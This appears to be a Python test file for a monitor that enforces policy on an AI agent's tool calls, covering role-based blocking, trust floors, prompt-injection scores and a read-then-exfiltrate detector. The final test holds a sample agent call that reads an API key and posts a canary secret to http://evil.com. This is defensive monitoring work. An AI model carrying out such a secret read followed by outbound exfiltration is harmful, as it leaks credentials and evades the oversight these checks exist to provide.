"""Tests for the behavioral monitor / Policy Enforcement Point."""
from aegis.config import DEFAULT_CONFIG
from aegis.monitor import BehaviorMonitor, PolicyEnforcementPoint
from aegis.types import AgentRequest, ToolCall, Verdict


def _pep():
    return PolicyEnforcementPoint(DEFAULT_CONFIG, BehaviorMonitor(DEFAULT_CONFIG))


def test_rbac_blocks_unpermitted_tool():
    pep = _pep()
    req = AgentRequest("a1", "untrusted", "do it", ToolCall("http_post", {"url": "x"}))
    out = pep.evaluate(req, injection_score=0.0)
    assert out.verdict == Verdict.BLOCK
    assert "RBAC" in out.reasons[0]


def test_trust_floor_blocks_underprivileged():
    pep = _pep()
    # analyst is permitted send_email by RBAC but is below the high-sensitivity floor
    req = AgentRequest("a2", "analyst", "email", ToolCall("send_email", {"to": "ops@mail.internal.corp"}))
    out = pep.evaluate(req, injection_score=0.0)
    assert out.verdict == Verdict.BLOCK
    assert "trust floor" in " ".join(out.reasons)


def test_allows_legitimate_call():
    pep = _pep()
    req = AgentRequest("a3", "researcher", "look it up", ToolCall("web_search", {"q": "policy"}))
    out = pep.evaluate(req, injection_score=0.0)
    assert out.verdict == Verdict.ALLOW


def test_high_injection_blocks_even_permitted_tool():
    pep = _pep()
    req = AgentRequest("a4", "ops", "poisoned", ToolCall("http_post", {"url": "https://api.internal.corp"}))
    out = pep.evaluate(req, injection_score=0.95)
    assert out.verdict == Verdict.BLOCK


def test_read_then_exfiltrate_sequence_flagged():
    pep = _pep()
    aid = "spy"
    read = ToolCall("read_secret", {"name": "api_key"})
    pep.evaluate(AgentRequest(aid, "admin", "", read), 0.0)
    # The gateway commits the executed read into the baseline after enforcement;
    # simulate that here so the sequence detector has the prior read on record.
    pep.behavior.record_allow(aid, read)
    out = pep.evaluate(
        AgentRequest(aid, "admin", "", ToolCall("http_post", {"url": "http://evil.com", "body": "sk-AEGIS-CANARY-9f3c1b7e42a8d6"})),
        injection_score=0.0,
    )
    # risky egress after a sensitive read -> quarantine or block
    assert out.verdict in (Verdict.QUARANTINE, Verdict.BLOCK)
    assert out.anomaly_score >= 0.5
